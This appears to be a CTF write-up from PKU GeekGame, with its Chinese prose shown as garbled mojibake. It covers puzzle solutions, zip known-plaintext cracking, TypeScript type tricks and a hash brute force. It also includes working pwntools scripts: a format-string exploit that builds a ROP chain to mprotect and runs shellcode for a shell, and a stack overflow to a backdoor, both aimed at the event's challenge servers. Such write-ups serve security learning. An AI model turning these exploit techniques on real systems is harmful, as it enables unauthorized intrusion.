# 0x00. ä¸€çœ¼ç›¯å¸§

æœç´¢å¾—åˆ°ä¸€ä¸ª gif æ‹†å¸§ç½‘ç«™, ç„¶åæŠŠå¾—åˆ°çš„å­—ç¬¦ä¸²åšä¸€ä¸ªå¾ªç¯ç§»ä½å³å¾— flag.

```cpp
#include <bits/stdc++.h>
using namespace std;
const char *str = "synt{unirshangtrrxtnzr}";
int main (){
	int n = strlen (str);
	for (int i = 0; i < n; ++i)
		if (i == 4 || i == n - 1) putchar (str[i]);
		else putchar ((str[i] - 'a' + 's' - 'f' + 26) % 26 + 'a');
	putchar ('\n');
}
```

# 0x01. å°åŒ—é—®ç­”!!!!!

> â€œè§‰å¾—ç­‰å¾…ä¸€å°æ—¶å†·å´å¼€å¿ƒï¼Œæˆ‘ä¸€æ¬¡éƒ½æ²¡æœ‰è¿™æ ·æƒ³è¿‡â€  
> â€œè™½ç„¶åšä¸€æ•´åœºçš„å°åŒ—é—®ç­”æœ‰äº›è¶…ä¹æƒ³è±¡ï¼Œä½†å¦‚æœç´¯ç§¯èµ·ä¸€ä¸ªåˆä¸€ä¸ªå°æ—¶ï¼Œæˆ–è®¸ä¹Ÿä¸æ˜¯çœŸçš„ä¸å¯èƒ½å§â€  
> â€œç­”æ¡ˆå¥½åƒä¸å¤ªå¯¹å–µï¼Œä½ å†æƒ³æƒ³å–µï¼Œåˆ«æ€¥æ€¥æ€¥æ€¥æ€¥æ€¥å–µâ€

1. Google æœç´¢é¢˜ç›®æ‰¾åˆ°[åšå®¢](https://blog.csdn.net/Kangyucheng/article/details/104858780), å¾—çŸ¥ä½¿ç”¨ `sbatch` å‘½ä»¤æäº¤ä»»åŠ¡.
2. ç¿»æ‰¾ [Github ä»“åº“](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss), åœ¨ Makefile å¼€å¤´æ‰¾åˆ°äº†ä¸‰ä¸ªå¾ˆåƒç‰ˆæœ¬å·çš„æ•°å­—.
3. Google æœç´¢é¢˜ç›®æ‰¾åˆ°[åšå®¢](https://blog.csdn.net/qq_19926599/article/details/86747401), å¾—çŸ¥ç­”æ¡ˆä¸º `Watch6,16`.
4. åœ¨ github ä¸Šçš„ [PKU-GeekGame](https://github.com/PKU-GeekGame) æœç´¢ nickname æ‰¾åˆ°[æºä»£ç ](https://github.com/PKU-GeekGame/gs-backend/blob/2a1b6743559b95a534e186c4e170eab6b8de5400/src/store/user_profile_store.py#L72), æŠŠè¿™ä¸€æ®µå¤åˆ¶ä¸‹æ¥, è¾“å‡º `DISALLOWED_CHARS` çš„å…ƒç´ ä¸ªæ•°å³å¯. æ ¹æ®ä¸€é˜¶æ®µæç¤ºå’Œä»“åº“çš„ `README.md`, è¦ä½¿ç”¨ 3.8 çš„ python ç‰ˆæœ¬è¿è¡Œ.
5. ç”±ç»´åŸºç™¾ç§‘çŸ¥ 2011 å¹´ 1 æœˆçš„ b ç«™åŸŸåä¸º `bilibili.us`, ä½¿ç”¨ web archive æœç´¢åˆ°[æ¸¸æˆåŒºé¡µé¢](https://web.archive.org/web/20110102140319/http://bilibili.us/video/game.html), æ‰€ä»¥æ˜¯`æ¸¸æˆè§†é¢‘,æ¸¸æˆæ”»ç•¥Â·è§£è¯´,Mugen,flashæ¸¸æˆ`.
6. Google æœç´¢å›¾ç‰‡å¾—çŸ¥æ˜¯å¢æ£®å ¡éŸ³ä¹å…, ç»ç”±ç»´åŸºç™¾ç§‘çš„é“¾æ¥æ‰¾åˆ°å®˜ç½‘ä¸º `philharmonie.lu`.

# 0x02. Z å…¬å¸çš„æœåŠ¡å™¨

## æœåŠ¡å™¨

ä½¿ç”¨ Wireshark æ‰“å¼€æµé‡åŒ…, æ‰¾åˆ°ä¼ è¾“å†…å®¹å¼€å¤´æ˜¯ `rz`, æ‰€ä»¥æœåŠ¡å™¨ä½¿ç”¨ `sz` å‘½ä»¤é€šè¿‡ zmodem åè®®ä¼ è¾“æ–‡ä»¶. å°è¯•ä¸€å †å®¢æˆ·ç«¯è½¯ä»¶, æ‰¾åˆ° SecureCRT 5.1 å¯ä»¥æˆåŠŸæ¥æ”¶ `flag.txt`.

# 0x04. åŸºæœ¬åŠŸ

## ç®€å•çš„ flag

å‘ç°å‹ç¼©åŒ…é‡Œé™¤äº† flag ä¹‹å¤–è¿˜æœ‰ `chromedriver_linux64.zip`, è€Œå…¶æ–‡ä»¶å¤§å°ä¸º $5.57\ \mathrm{MB}$, Google æœç´¢å¾—çŸ¥å…¶ä¸º 89.0.4389.23 ç‰ˆæœ¬. ä½¿ç”¨ ARCHPR æ˜æ–‡æ”»å‡»å³å¾—æ— å¯†ç çš„å‹ç¼©åŒ….

## å†·é…·çš„ flag

å­¦ä¹  [pcapng æ–‡ä»¶æ ¼å¼](https://pcapng.com/)å¾—çŸ¥å¼€å¤´æœ‰è¿ç»­ $16$ ä¸ªå­—èŠ‚æ˜¯ç¡®å®šçš„, æ‰€ä»¥çŒœæµ‹åŒæ ·æ˜¯æ˜æ–‡æ”»å‡». æ‰¾åˆ° [bkcrack](https://github.com/kimci86/bkcrack), ç®—å‡º key å°±å¯ä»¥æŠŠ pcapng è§£å‹å‡ºæ¥.

```sh
$ bkcrack -C challenge_2.zip -c flag2.pcapng -x 8 4d3c2b1a01000000ffffffffffffffff
$ bkcrack -C challenge_2.zip -c flag2.pcapng -k d158956b c06e6d48 d1c500d0 -d flag2.pcapng
$ strings flag2.pcapng | grep flag{
```

# 0x05. Dark Room

## Flag 1

åœ¨é¢˜ç›®æºç é‡Œæ‰¾åˆ°å¦‚ä¸‹åœ°å›¾ï¼š

```
# Front_Door   #             #           #          #              #         #
# Locked_Door2 # Hallway     # Hallway   # Bad_Room #              #         #
#              #             # Hallway   #          #              #         #
#              #             # Dark_Room # Hallway  # Hallway      # Lootway #
#              # Good_Choice #           #          # Locked_Door1 #         #
#              # Choice_Room # Hallway   # Hallway  # Hallway      #         #
#              # Bad_Choice  #           #          # Loot_Dirty   #         #
```

å…ˆå» `Bad_Room` æ‹¿åˆ°é’¥åŒ™æ‰“å¼€ `Locked_Door1`, ç„¶åå» `Good_Choice` æ‹¿åˆ°é’¥åŒ™æ‰“å¼€ `Locked_Door2`. ä¸­é€”ç»è¿‡ `Lootway` å’Œ `Loot_Dirty` å¯ä»¥æé«˜ sanity, æœ€ç»ˆåˆ°è¾¾ `Front_Door` æ—¶çš„ sanity ä¸º $90$, æ‰€ä»¥å†™è„šæœ¬åˆ·å‡ºä¸‰æ¬¡å¢åŠ  sanity çš„ `help` å³å¯.

```py
from Crypto.Util.number import *
from pwn import *
from ast import literal_eval
from subprocess import getoutput
from time import sleep

context (os='linux', arch='x86_64')

while True:
    sleep (2)
    sh = remote('prob16.geekgame.pku.edu.cn', 10016)
    sh.recvuntil (b'token: ')
    sh.sendline (b'70:This_is_token')

    sh.recvuntil (b']: ')
    sh.sendline (b'newgame')
    sh.recvuntil (b']: ')
    sh.sendline (b'70')
    sh.recvuntil (b') ')
    sh.sendline (b'y')
    
    flag = True
    for i in range (3):
        sh.recvuntil (b']: ')
        sh.sendline (b'h')
        sh.recvuntil (b'(')
        sanity = int (sh.recvuntil (b'%')[:-1])
        print ("sanity =", sanity)
        if sanity != 109 + i * 9:
            print ("wocuole!")
            flag = False
            sh.close ()
            break
    if flag:
        print ("woduile!")
        sh.interactive ()
        break
```

# 0x06. éº¦æ©Â·åº“æ‹‰å¤«ç‰¹

> â€œä½ è¿™è¾ˆå­å°±æ˜¯è¢« CTF ç»™å®³äº†ï¼Œæ²¡æ³•è·Ÿæ­£ç»å°å¯çˆ±å¤„äº‹ï¼Œè·Ÿå°å¯çˆ±åƒé¥­çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨æƒ³ï¼Œè¦æ˜¯èƒ½å¯å‘æˆ‘å°åŒ—é—®ç­”çš„æ€è·¯å°±å¥½äº†ã€‚é€å¯¹æ–¹å›å®¶çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨æƒ³ï¼Œè¦æ˜¯èƒ½ç¤¾å·¥æ‰¾åˆ°åœ°å€å°±å¥½äº†ã€‚ååœ¨äººå®¶çš„æ²™å‘ä¸Šçš„æ—¶å€™ï¼Œå¯¹æ–¹è¯´è¿›æˆ¿é—´æ¢ä¸ªè¡£æœï¼Œä½ çš„å¿ƒæ€¦æ€¦è·³â€”â€”è¦æ˜¯å‡ºæ¥çš„æ—¶å€™ç»™ä½ å±•ç¤º XSS æŠ€å·§æ€ä¹ˆåŠï¼Ÿè¦æ˜¯é è¿‡æ¥æ—¶è¦æ‹‰ä½ å»æ‰“ç‘å…¸åŸç¥æ€ä¹ˆåŠï¼Ÿç„¶åå°å¯çˆ±ç©¿ç€ç¡è¡£å‡ºæ¥äº†ï¼Œé—®ä½ åšä¸åšä¸€äº›ä¸¤ä¸ªäººæ‰èƒ½åšçš„äº‹æƒ…ï¼Œä½ åæ‰‹æ–°å»º 114514 å¼ åç»´ç è®©å°å¯çˆ±æ¥å¼€è’ï¼Œå¯¹æ–¹æ²‰é»˜äº†ä¸€ä¼šè¯´æˆ‘è¯´çš„ä¸æ˜¯ CTFã€‚â€â€”â€”èŠ‚é€‰è‡ª GeekGame é€‰æ‰‹ç¾¤

## æ¢ç´¢çš„æ—¶å…‰

ä½¿ç”¨æ—è§‚è€…æ¨¡å¼, è·Ÿç€ç«æŠŠçš„æ–¹å‘èµ°å°±èƒ½æ‰¾åˆ°å†™ç€ flag çš„ç‰Œå­.

![](1.png)

## ç»“æŸäº†ï¼Ÿ

æŸ¥çœ‹å­˜æ¡£é‡Œçš„ `region` æ–‡ä»¶å¤¹, æŸ¥é˜… MC ç™¾ç§‘çŸ¥å…¶æŒ‰ $x$ å’Œ $z$ åæ ‡ä»¥ $512$ é•¿åº¦åˆ†å—, è€Œå‡ºç”Ÿç‚¹åœ¨åŸç‚¹é™„è¿‘, æ‰€ä»¥ flag2 åº”è¯¥è—åœ¨ç¦»åŸç‚¹å·¨å¤§è¿œä¸”æ–‡ä»¶å·¨å¤§çš„ $(6,-4)$, æ ¹æ®é™„è¿‘çš„æ–‡ä»¶å¤§å°çŒœæµ‹åº”è¯¥åœ¨ $x$ å’Œ $z$ åæ ‡è¾ƒå°çš„ $1/4$ éƒ¨åˆ†.

è€ƒè™‘ `fill` æŒ‡ä»¤, æ¯æ¬¡å°è¯•æŠŠä¸€ä¸ªé•¿æ–¹ä½“åŒºåŸŸçš„æ‰€æœ‰é’»çŸ³å—æ›¿æ¢ä¸ºé‡‘å—, æ¸¸æˆä¼šæŠ¥å‘Šæ›¿æ¢äº†å¤šå°‘å—, ä½†æ¯æ¬¡è‡³å¤šæ£€æŸ¥ $2^{15}$ å—, æ‰€ä»¥å…ˆæšä¸¾ $z$ åæ ‡, ç”¨ `/fill 3073 -63 -18xx 3328 64 -18xx minecraft:gold_block replace minecraft:diamond_block` æ£€æŸ¥ `-18xx` æ˜¯ä¸æ˜¯é’»çŸ³å—æ‰€åœ¨åæ ‡, æ‰¾åˆ°ä¹‹ååœ¨ $x,y$ å¹³é¢é‡ŒäºŒåˆ†å°±å¥½äº†.

![](2.png)

## ä¸ºä»€ä¹ˆä¼šå˜æˆè¿™æ ·å‘¢ï¼Ÿ

æŸ¥çœ‹å­˜æ¡£é‡Œçš„ `region` æ–‡ä»¶å¤¹çš„æ–‡ä»¶å¤§å°, å‘ç° $(1,-1)$ æ–‡ä»¶å·¨å¤§, é£å»é‚£é‡Œä¹‹åå‘ç°ä¸€ä¸ªå·¨å¤§å»ºç­‘ç‰©, å±…ç„¶æ˜¯å¼ºå¤§çš„å‡ºé¢˜äººé€ çš„çº¢çŸ³è®¡ç®—æœº /jy

æ ¹æ®æ¸¸æˆé‡Œçš„æç¤º, è®¡ç®—æœºä¼šå¾ªç¯è¾“å‡ºä¸€ä¸ª 2KB å¤§å°çš„æ–‡ä»¶, æ‰€ä»¥çŒœæµ‹æ˜¯å­˜å‚¨ flag çš„å›¾ç‰‡. å¯¹ç”µè·¯çš„ $16$ ä¸ªè¾“å‡ºåˆ†åˆ«æ¥ä¸Šä¸€ä¸ªå‘½ä»¤æ–¹å—, æŠŠæ•°å­—æ‰“å°åˆ°æ—¥å¿—é‡Œ. å¾ˆå¿«å•Š, ä¸€çœ¼æœ›å»çœ‹åˆ°ä¸€ä¸ª `89 50 4E 47`, æ„Ÿè§‰ç¨³äº†, ä½†æ˜¯å¾ˆæœ‰é—®é¢˜: è¿™ä¸ªå­—ç¬¦ä¸²å±…ç„¶æ²¡æœ‰ç›¸é‚»ç›¸åŒå­—ç¬¦, åŸæ¥æ˜¯è¾“å‡ºç”µè·¯ä¸€ç›´ä¿æŒé«˜ç”µå¹³, æ‰€ä»¥å‘½ä»¤æ–¹å—åªä¼šè¾“å‡ºä¸€æ¬¡.

è€ƒè™‘æå‡ºä¸€ä¸ª 5Hz çš„æ‰“ç‚¹è®¡æ—¶å™¨, å‘æ—¥å¿—é‡Œæ‰“å°æ—¶é—´æˆ³, å°±å¯ä»¥çŸ¥é“ç›¸é‚»è¿ç»­æ®µé‡Œæœ‰å¤šå°‘å­—ç¬¦. æŠŠä¸¤ä¸ªçº¢çŸ³ä¸­ç»§å™¨è¿æˆä¸€ä¸ªå›è·¯, å¤–æ¥ä¸€ä¸ªæ‰“å° `-` çš„å‘½ä»¤æ–¹å—, å†è°ƒæ•´ä¸€ä¸‹ä¸­ç»§å™¨çš„å»¶è¿Ÿè®©å®ƒä»¬å°½å¯èƒ½å¯¹é½, æœ€åæŠŠæ—¥å¿—é‡Œçš„å­—ç¬¦ä¸²æå‡ºæ¥, æŠŠæ¯ä¸ª `-` æ›¿æ¢æˆä¹‹å‰çš„å­—ç¬¦. ä¸è¿‡æœ‰æ—¶ä¼šå‡ºç°ç›¸é‚»ä¸¤ä¸ªæ•°å­—, è¿™æ—¶æŠŠç¬¬ä¸€ä¸ªæ•°å­—å¼ºåˆ¶åŒ¹é…ä¸€ä¸ª `-` å³å¯.

![](3.png)

æŠŠå¾—åˆ°çš„å­—ç¬¦ä¸²å¾ªç¯ç§»ä½ä½¿å¾—å¼€å¤´æ˜¯ `89 50 4E 47`, ä½œä¸º png æ–‡ä»¶æ‰“å¼€:

![](4.png)

æ„Ÿè§‰èƒ½æ‰“å¼€å°±æ˜¯å¥‡è¿¹äº†, ä½†è¿™ä¹Ÿå¤ªæ‰­æ›²äº†, åé¢å‡ ä¸ªæ ¹æœ¬çœ‹ä¸å‡ºæ˜¯å•¥å­—ç¬¦, å°è¯•äº†å‡ ä¸ªå¤§æ¦‚å¯èƒ½çš„è¯»æ³•å‡ä»¥å¤±è´¥å‘Šç»ˆ, ~~äºæ˜¯è¢«è¿«æŠ±ç€å‰åŠŸå°½å¼ƒçš„æ‡Šæ‚”ç¡è§‰~~.

æ—©ä¸Šèµ·æ¥åˆç›¯äº†ä¸€æ®µæ—¶é—´, çªç„¶æƒ³åˆ°å¤§æ¦‚æ˜¯ä¸€äº›ä½ç½®åç§»ä¹‹ç±»çš„åœ°æ–¹è¿˜åŸç‚¸äº†, çœ‹ä¸‹åˆ’çº¿çš„ä½ç½®çŒœæµ‹ä¸‹åŠéƒ¨åˆ†å‘å·¦åç§»äº†ä¸€ç‚¹, äºæ˜¯æå‡ºä¼Ÿå¤§çš„ mspaint, é€‰ä¸­è¿™éƒ¨åˆ†åç§»å›å».

![](5.png)

å®Œç¾! å±…ç„¶æ˜¯ `EFPjE`, çœŸæ˜¯å¤ªæ‰­æ›²äº† /oh

# 0x07. Emoji Wordle

## Level 1

æ¯æ¬¡è¯¢é—® Placeholder, å¯¹äºæ¯ç§å‡ºç°çš„å­—ç¬¦, å¤åˆ¶ $64$ éç„¶åè¯¢é—®, å³å¾—è¿™ç§å­—ç¬¦åœ¨å“ªäº›ä½ç½®å‡ºç°è¿‡. é‡å¤æ­¤è¿‡ç¨‹, ç›´è‡³ç­”æ¡ˆé‡Œçš„æ¯ç§å­—ç¬¦éƒ½è¢«è¯¢é—®åˆ°.

## Level 2

çŒœæµ‹ç­”æ¡ˆå­˜å‚¨åœ¨ `PLAY_SESSION` cookie é‡Œ, base64 è§£ç ä¸€ä¸‹, å‘ç° `target` å­—æ®µå¾ˆåƒç­”æ¡ˆ. ç”¨ Level 1 çš„æ–¹æ³•è¯¢é—®å‡ ä¸ª, å¾—åˆ°å¦‚ä¸‹å¯¹åº”å…³ç³»:

```
ğŸ’† = '\xf0\x9f\x92\x86' = '\uD83D\uDC86'
ğŸ‘© = '\xf0\x9f\x91\xa9' = '\uD83D\uDC69'
ğŸ¿ = '\xf0\x9f\x90\xbf' = '\uD83D\uDC3F'
```

å…¶ä¸­ `\uD83D\uDC` æ˜¯å›ºå®šçš„, é—®é¢˜åœ¨äºåä¸¤ä½. æ¯”å¦‚ `3F` ä¸ `bf` æ¨¡ $64$ åŒä½™, è€Œç›¸å·®çš„å€æ•°å†åŠ  $2$ å³å¾—å­—ç¬¦ç¼–ç çš„å€’æ•°ç¬¬ $3$ ä½, å†™ä¸ªè½¬æ¢ç¨‹åºå³å¾—.

```py
string = "85/D83D/DC57/D83D/DC61/D83D/DC85/D83D/DC62/D83D/DC43/D83D/DC57/D83D/DC8A/D83D/DC45/D83D/DC5E/D83D/DC69/D83D/DC3F/D83D/DC57/D83D/DC5E/D83D/DC72/D83D/DC5D/D83D/DC5F/D83D/DC78/D83D/DC7B/D83D/DC82/D83D/DC41/D83D/DC76/D83D/DC69/D83D/DC78/D83D/DC55/D83D/DC5A/D83D/DC73/D83D/DC85/D83D/DC66/D83D/DC64/D83D/DC89/D83D/DC67/D83D/DC5B/D83D/DC6A/D83D/DC48/D83D/DC55/D83D/DC86/D83D/DC5E/D83D/DC77/D83D/DC72/D83D/DC79/D83D/DC45/D83D/DC5C/D83D/DC72/D83D/DC85/D83D/DC86/D83D/DC88/D83D/DC80/D83D/DC87/D83D/DC74/D83D/DC84/D83D/DC46/D83D/DC3F/D83D/DC52/D83D/DC48/D83D/DC44/D83D/DC72/D83D/DC81/D83D/DC7D/D83D/DC58/D83D/DC45/D83D/DC72/D83D/DC7C/D83D/DC45"
list = map (lambda x: int (x, 16), string.split ('/D83D/DC'))
ans = b''
for i in list:
	ans += b'\xf0\x9f' + (i // 64 + 0x90).to_bytes (1, 'little') + (i % 64 + 0x80).to_bytes (1, 'little')
print (ans.decode ())
```

# 0x09. ç®€å•çš„æ‰“å­—ç¨¿

> â€œä¸–ç•Œä¸Šæœ€é¥è¿œçš„è·ç¦»ï¼Œæ˜¯æˆ‘å’Œä½ åœ¨åŒä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æˆ‘è§ä¸åˆ°ä½ ã€‚â€â€”â€”èŠ‚é€‰è‡ª GeekGame é€‰æ‰‹ç¾¤

## Super Easy

æœç´¢åˆ°[è¿™ç¯‡å¸–å­](https://stackoverflow.com/questions/73207976/substring-of-a-string-type-typescript), å¾—çŸ¥å¦‚ä¸‹çš„ä»£ç ç¼–è¯‘é€šè¿‡å½“ä¸”ä»…å½“ç»™å‡ºçš„å­—ç¬¦ä¸²æ˜¯ `flag1` çš„å­ä¸².

```ts
function transform<T extends string>(str: flag1 extends `${string}${T}${string}` ? T : never) {}
transform ('{tOo0_e4SY_f1aG_foR_TOoo_EAsy_lANg}');
```

äºæ˜¯è½¬åŒ–ä¸ºå¦‚ä¸‹é—®é¢˜: ç»™å®š `flag1`, æ¯æ¬¡è¯¢é—®å­—ç¬¦ä¸² $s$ æ˜¯å¦ä¸º `flag1` çš„å­ä¸². æˆ‘çš„åšæ³•æ˜¯å…ˆè¯¢é—®ä¸€é ascii åœ¨ 32 åˆ° 122 ä¹‹é—´çš„æ¯ä¸ªå­—ç¬¦~~åšå…³é”®è¯è¿‡æ»¤å¯¼è‡´çš„å–µ~~, å³å¾— `flag1` é‡Œå‡ºç°äº†å“ªäº›å­—ç¬¦, ç„¶åä» `{` å¼€å§‹æ‰©å±•å‰ç¼€, æ¯æ¬¡æšä¸¾ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆ, ç›´è‡³ `}` å°±åšå®Œäº†. â€œåªéœ€â€å‡ ç™¾æ¬¡è¯¢é—®, çº¯æ‰‹å·¥æ‰“é€ åå‡ åˆ†é’Ÿå°±å‡ºæ¥äº†~~ä¸ä¼šå†™ç½‘é¡µè„šæœ¬å¯¼è‡´çš„å–µ~~.

## Very Easy

~~æ ¹æ®åˆ†å€¼çŒœæµ‹~~åªéœ€æŠŠå­—ç¬¦ä¸²çš„åµŒå¥—ç±»å‹å‰¥å¼€å°±è¡Œ. å­¦ä¹ ä¸€ä¸‹ TypeScript å…³äºç±»å‹çš„å„ç§è¯­è¨€ç‰¹æ€§, å‘ç° `extends` å¯¹ç±»å‹è”åˆå…·æœ‰åˆ†é…å¾‹, ä»è€Œå¯ä»¥æŠŠ `object |` åˆ æ‰, ç„¶åä½¿ç”¨ `infer` åšç±»å‹æ¨æ–­å³å¯. å‰©ä¸‹çš„éƒ¨åˆ†ä¸ `flag1` ç›¸åŒ, è™½ç„¶ç°åœ¨æ‰å‘ç° `infer` å¥½åƒä¹Ÿå¯ä»¥æ¨æ–­å‡ºå­ä¸²å°±æ˜¯äº† qwq

```ts
type crychic<T> = T extends new () => { v : () => infer R } ? R : never;
type soyo = crychic<flag2>;
type mygo<T> = T extends (a: (a: unknown, b: infer P & Record<string, string>) => never) => any ? P : never;
type soyorin = keyof mygo<soyo>;

function transform<T extends string>(str: soyorin extends `${string}${T}${string}` ? T : never) {}
transform ('{Ts_FLaG_beTTer_tHan_PytH0N!}');
```

# 0x0C. æ±‰åŒ–ç»¿è‰²ç‰ˆå…è´¹ä¸‹è½½

~~è¯¶æ˜¯ kirikiri, è¿™ä¸ªæˆ‘ç†Ÿå•Š!~~  
~~ä»€ä¹ˆè¦è§£åŒ… gal? ä¸äº†è§£, æˆ‘åªä¼šç© gal :(~~

## æ™®é€šä¸‹è½½

ä½¿ç”¨ GARbro è§£åŒ… `data.xp3`, æ–‡ä»¶å¤¹é‡Œæœç´¢ `flag{` å­ä¸²å³å¾—.

## é«˜é€Ÿä¸‹è½½

Google æœç´¢æ‰¾åˆ°[åšå®¢](https://iyn.me/i/post-45.html), ä»è€Œæ‰¾åˆ° [KirikiriDescrambler.exe](https://github.com/arcusmaximus/KirikiriTools/releases/tag/1.7) åæ··æ·†å­˜æ¡£æ–‡ä»¶, æ‰‹ç©ç„¶åå­˜ä¸ªå­˜æ¡£è§‚å¯Ÿä¸€ä¸‹, å‘ç° `data0.kdt` é‡Œçš„ `prev_hash` å­˜äº† flag çš„ Hash å€¼, `datasu.ksd` é‡Œçš„å‚æ•°è¡¨æ˜ flag é‡Œåˆ†åˆ«æœ‰ $6$ ä¸ª `A`, $3$ ä¸ª `E`, $1$ ä¸ª `I`, $6$ ä¸ª `O`, è€Œ `scenario/round2.ks` é‡Œå†™äº† Hash å€¼è®¡ç®—æ–¹æ³•.

æˆ‘ä»¬åªéœ€å†™ä¸€ä¸ª dfs æšä¸¾æ‰€æœ‰ç”± $6$ ä¸ª `A`, $3$ ä¸ª `E`, $1$ ä¸ª `I`, $6$ ä¸ª `O` ç»„æˆçš„å­—ç¬¦ä¸², åˆ†åˆ«è®¡ç®— Hash å€¼å¹¶æ¯”å¯¹å³å¯. ~~ç„¶è€Œæˆ‘æŠŠç¨‹åºä¸¢äº†, æ‚¨è¦ç›¸ä¿¡æˆ‘ç¡®å®æ˜¯ä¼šå†™ dfs çš„ /kel~~ ç®—äº†æˆ‘è¿˜æ˜¯é‡å†™ä¸€ä¸‹å§ /kk

```cpp
#include <bits/stdc++.h>
using namespace std;
typedef long long LL;
const char *str = "AEIO";
const int mod = 19260817, bs = 13337;
int cnt[4] = {6, 3, 1, 6}, nowh = 1337;
vector<int> now;
int main () {
	if (now.size () == 16) {
		if ((nowh * 13337ll + 66) % mod == 7748521) {
			printf ("flag{");
			for (int i = 0; i < 16; ++i)
				putchar (str[now[i]]);
			puts ("}");
			exit (0);
		}
		return 0;
	}
	for (int i = 0; i < 4; ++i)
		if (cnt[i]) {
			int tmp = nowh; -- cnt[i]; now.push_back (i);
			nowh = (nowh * 13337ll + 11 * (i + 1)) % mod;
			main (); nowh = tmp;
			++ cnt[i]; now.pop_back ();
		}
}
```

# 0x0D. åˆå­¦ C è¯­è¨€

## Flag 1

`printf` çš„å‚æ•°ä¸ªæ•°ç”±æ ¼å¼åŒ–å­—ç¬¦ä¸²å†³å®š, è€Œç¬¬ $7$ ä¸ªä¹‹åçš„å‚æ•°åœ¨æ ˆä¸Š, æ‰€ä»¥å¯ä»¥æŠŠæ ˆå¸§è¾“å‡º, å†™ä¸ªç¨‹åºè½¬æˆå­—ç¬¦ä¸².

```cpp
// %s %d %d %d %d 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx
#include <stdio.h>
typedef unsigned long long ULL;
const ULL a[4] = {0x3465527b67616c66, 0x66546e3152505f44, 0x6f735f456430635f, 0xa7d797a34655f};
int main () { printf ("%s", (char *)a); }
```

## Flag 2

é¢˜ç›®è¦æ±‚æŠŠ shell è¿è¡Œå‡ºæ¥. æ³¨æ„åˆ°ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸² `%...$hhn` å¯ä»¥ä¿®æ”¹æ ˆä¸Šçš„ä»»æ„ä½ç½®, æ‰€ä»¥å¯ä»¥ç»•è¿‡é‡‘ä¸é›€å®ç° ROP. å…ˆæŠŠæ ˆåœ°å€å’Œä»£ç æ®µåœ°å€æ‹¿åˆ°, ç„¶åè°ƒç”¨ `mprotect` å‡½æ•°æŠŠæ ˆè®¾ä¸ºå¯æ‰§è¡Œçš„, æœ€åè·³è½¬åˆ°æ ˆä¸Šçš„ shell code.

```py
from Crypto.Util.number import *
from pwn import *
from ast import literal_eval
from subprocess import getoutput

context (os='linux', arch='x86_64')
maxlen = 272

def fmt_str(addr, target):
    fmtstr = "a" * target
    fmtstr += "%" + str(34 + maxlen // 8) + "$hhn"
    fmtstr += ' ' * (maxlen - len(fmtstr))
    return fmtstr.encode () + p64 (addr)

# `addr` is address in real time
def modify (addr, target):
    for i in range (8):
        sh.recvuntil (b'instruction:\n')
        payload = fmt_str (addr + i, (target >> (i * 8)) & 255)
        sh.sendline (payload)

# `soyo` is address in gdb (w/o randomization)
def modify_addr (soyo, target):
    addr = pubaddr + (soyo - 0xd520)
    modify (addr, target)

def get_int (offset):
    sh.recvuntil (b'instruction:\n')
    fmtstr = "%" + str(offset) + "$p"
    sh.sendline (fmtstr.encode ())
    return int (sh.recvline ().strip ().decode (), 16)

def get_addr_int (soyo):
    offset = (soyo - 0xd4c0) // 8 + 6
    return get_int (offset)

sh = remote('prob09.geekgame.pku.edu.cn', 10009)
sh.recvuntil (b'token: ')
sh.sendline (b'70:This_is_token')

pubaddr = get_int (1)
retaddr = get_addr_int (0xd9b8)
print ('retaddr =', retaddr)

shell_code = asm (shellcraft.sh())
print ('sc_len =', len (shell_code))

for i in range (len (shell_code)):
    modify (pubaddr + i, shell_code[i])

modify_addr (0xd9b8 + 0x00, retaddr + 0x9cd2 - 0xa3fd)  # pop rdi ; ret
modify_addr (0xd9b8 + 0x08, pubaddr & -4096)
modify_addr (0xd9b8 + 0x10, retaddr + 0x1781e - 0xa3fd)  # pop rsi ; ret
modify_addr (0xd9b8 + 0x18, 2 << 12)
modify_addr (0xd9b8 + 0x20, retaddr + 0x9bdf - 0xa3fd)  # pop rdx ; ret
modify_addr (0xd9b8 + 0x28, 7)
modify_addr (0xd9b8 + 0x30, retaddr + 0x5ab10 - 0xa3fd) # <mprotect>
modify_addr (0xd9b8 + 0x38, pubaddr)

sh.recvuntil (b'instruction:\n')
sh.sendline (b'exit')

sh.interactive ()
```

# 0x0E. Baby Stack

## Flag 1

ä¸¢è¿› IDA, å‘ç°é•¿åº¦é™åˆ¶è¾“å…¥ $0$ å°±æ˜¯æ²¡æœ‰é™åˆ¶, ç›´æ¥æŠŠè¿”å›åœ°å€è¦†ç›–ä¸º `backdoor` çš„åœ°å€å³å¯. ä½†æ˜¯è¦è¡¥ä¸€ä¸ª `ret` æŒ‡ä»¤, ä»è€Œæ»¡è¶³ `rsp` æŒ‰ $16$ å­—èŠ‚å¯¹é½çš„è¦æ±‚.

```py
from Crypto.Util.number import *
from pwn import *
from ast import literal_eval
from subprocess import getoutput

context (os='linux', arch='x86_64')

sh = remote('prob10.geekgame.pku.edu.cn', 10010)
sh.recvuntil (b'token: ')
sh.sendline (b'70:This_is_token')

sh.recvuntil (b'included!)\n')
sh.sendline (b'0')
sh.recvuntil (b'string:\n')
sh.sendline (b'a' * 0x78 + p64 (0x4011d3) + p64 (0x4011b6))
sh.interactive ()
```

## Flag 2

ä¸¢è¿› IDA å¾—å‡ºå¦‚ä¸‹æºç :

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-78h] BYREF
  char s[56]; // [rsp+40h] [rbp-38h] BYREF

  init(argc, argv, envp);
  puts("please enter your flag~(less than 0x20 characters)");
  __isoc99_scanf("%s", s);
  if ( (int)strlen(s) > 32 )
  {
    puts("byebye~");
  }
  else
  {
    printf("this is your flag: ");
    printf(s);
    puts("\nWhat will you do to capture it?:");
    __isoc99_scanf("%s", v4);
    puts("so you want to ");
    printf(v4);
    printf("\n and your flag again? :");
    __isoc99_scanf("%s", s);
    puts(s);
    puts("go0d_j0b_und_go0d_luck~:)");
  }
  return 0;
}
```

